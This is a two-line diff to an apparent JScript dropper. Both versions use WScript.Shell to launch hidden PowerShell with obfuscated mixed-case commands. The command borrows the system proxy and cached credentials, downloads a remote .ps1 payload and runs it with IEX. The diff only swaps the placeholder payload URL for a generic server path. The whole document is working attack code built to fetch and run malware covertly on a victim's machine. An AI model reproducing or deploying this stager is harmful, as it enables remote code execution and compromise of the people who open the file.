@@ -1,2 +1,2 @@
 a=new ActiveXObject("wsCripT.sHell");
-a.run('PoWeRsHeLl.eXe -NoP -w HiDDen -c $a=neW-ObJeCT nET.wEbClieNt;$a.pRoXy=[NeT.WeBreQueSt]::geTsyStEmweBprOxy();$a.prOxY.crEdEnTials=[NEt.crEdEnTiaLcaChe]::deFaUltcrEdeNtials;IEX $a.DowNlOadstRing(\'https://Link to your payload.ps1\')', 0);
+a.run('PoWeRsHelL.eXe -NoP -w HidDen -c $a=neW-ObJeCt nET.wEbClieNt;$a.pROxy=[NeT.WeBreQueSt]::geTsyStEmweBprOxy();$a.prOxY.crEdEnTials=[NEt.crEdEnTiaLcaChe]::deFaUltcrEdeNtials;IeX $a.DOwNLOadstRiNg(\'https://server/payload.ps1\')', 0);
